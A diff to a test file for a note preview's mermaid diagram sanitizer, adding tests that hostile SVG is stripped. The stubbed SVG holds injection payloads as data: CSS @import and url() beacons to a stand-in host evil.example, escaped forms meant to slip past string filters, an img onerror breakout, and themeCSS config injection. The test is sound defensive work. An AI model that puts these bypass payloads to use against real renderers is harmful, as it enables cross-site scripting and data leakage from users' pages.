@@ -359,8 +359,8 @@ describe('NotePreview mermaid fences', () => {
   });
 
   it('strips script and event handlers from the engine output', async () => {
-    // The rendered SVG is assigned with innerHTML, so it is sanitized locally
-    // rather than trusting the engine's own sanitizer alone.
+    // The rendered SVG reaches the live DOM, so it is sanitized locally rather
+    // than trusting the engine's own sanitizer alone.
     const engine = stubEngine(async () => ({
       svg:
         '<svg><style>@import url(https://evil.example/x.css);' +
@@ -379,14 +379,98 @@ describe('NotePreview mermaid fences', () => {
     expect(block?.querySelector('script')).toBeNull();
     expect(block?.querySelector('g')?.hasAttribute('onclick')).toBe(false);
     expect(block?.querySelector('a')?.hasAttribute('href')).toBe(false);
-    expect(block?.querySelector('g')?.getAttribute('style')).not.toContain(
-      'evil.example',
-    );
+    expect(block?.querySelector('g')?.hasAttribute('style')).toBe(false);
+    // An inline-SVG <style> is document-scoped, so an offending block goes
+    // whole rather than being patched in place.
     const style = block?.querySelector('style')?.textContent ?? '';
     expect(style).not.toContain('@import');
     expect(style).not.toContain('evil.example');
 
     preview.el.remove();
+  });
+
+  it('keeps the in-document references a real diagram is built from', async () => {
+    // The hostile cases below must not be bought by breaking ordinary mermaid
+    // output: markers, gradients and internal links are all `#` references.
+    const engine = stubEngine(async () => ({
+      svg:
+        '<svg><style>#d .edge{stroke:#333;marker-end:url(#arrow)}</style>' +
+        '<defs><marker id="arrow"><path d="M0,0 L4,2 L0,4"/></marker></defs>' +
+        '<a href="#section"><g class="edge" style="fill:url(#grad)">' +
+        '<use xlink:href="#arrow"/></g></a>' +
+        '<foreignObject><div class="label">Editor</div></foreignObject></svg>',
+    }));
+    const preview = new NotePreview({ mermaidLoader: async () => engine });
+    preview.render(DIAGRAM);
+    await flush();
+
+    const block = preview.el.querySelector('.note-mermaid')!;
+    expect(block.querySelector('style')?.textContent).toContain('url(#arrow)');
+    expect(block.querySelector('marker#arrow')).toBeTruthy();
+    expect(block.querySelector('a')?.getAttribute('href')).toBe('#section');
+    expect(block.querySelector('.edge')?.getAttribute('style')).toContain(
+      'url(#grad)',
+    );
+    expect(block.querySelector('use')).toBeTruthy();
+    // htmlLabels diagrams put their label text in a foreignObject subtree.
+    expect(block.querySelector('foreignObject .label')?.textContent).toBe(
+      'Editor',
+    );
+  });
+
+  it('drops CSS whose fetch is spelled with escapes, and img entirely', async () => {
+    // Two ways a string-level scrub is escaped around: CSS escape sequences
+    // (the parser resolves `\40 import` to `@import`), and markup that is
+    // inert where it was inspected but live once re-parsed (`<img>` inside
+    // `<style>` breaks out of foreign content on an innerHTML round trip).
+    const engine = stubEngine(async () => ({
+      svg:
+        '<svg><g style="background:\\75 rl(https://evil.example/c)"/>' +
+        '<style>\\40 import "https://evil.example/x.css";' +
+        '.n{background:\\75 rl(https://evil.example/beacon)}</style>' +
+        '<style>.m{background:url("https://evil.example/b")}' +
+        '<img src=x onerror=alert(1)></style></svg>',
+    }));
+    const preview = new NotePreview({ mermaidLoader: async () => engine });
+    document.body.appendChild(preview.el);
+    preview.render(DIAGRAM);
+    await flush();
+
+    const block = preview.el.querySelector('.note-mermaid')!;
+    expect(block.querySelector('style')).toBeNull();
+    expect(block.querySelector('img')).toBeNull();
+    expect(block.textContent).not.toContain('evil.example');
+    expect(block.querySelector('g')?.hasAttribute('style')).toBe(false);
+
+    preview.el.remove();
+  });
+
+  it('strips an unterminated config directive, which mermaid still reads', async () => {
+    // Mermaid's own directive regex ends in `(?:}%{2})?` — the closing `}%%`
+    // is optional, so a strip that requires it leaves a live carrier behind.
+    const engine = stubEngine();
+    const preview = new NotePreview({ mermaidLoader: async () => engine });
+    preview.render(
+      '```mermaid\n%%{init: {"themeCSS": "body{display:none}"}\nflowchart LR\n  A-->B\n```',
+    );
+    await flush();
+
+    const [, source] = vi.mocked(engine.render).mock.calls[0];
+    expect(source).not.toContain('themeCSS');
+  });
+
+  it('drops front matter whose config key is quoted', async () => {
+    // YAML can spell the key several ways, so front matter goes whole.
+    const engine = stubEngine();
+    const preview = new NotePreview({ mermaidLoader: async () => engine });
+    preview.render(
+      '```mermaid\n---\n"config":\n  themeCSS: "body{display:none}"\n---\nflowchart LR\n  A-->B\n```',
+    );
+    await flush();
+
+    const [, source] = vi.mocked(engine.render).mock.calls[0];
+    expect(source).not.toContain('themeCSS');
+    expect(source.trimStart().startsWith('flowchart LR')).toBe(true);
   });
 
   it('strips note-supplied config directives before rendering', async () => {
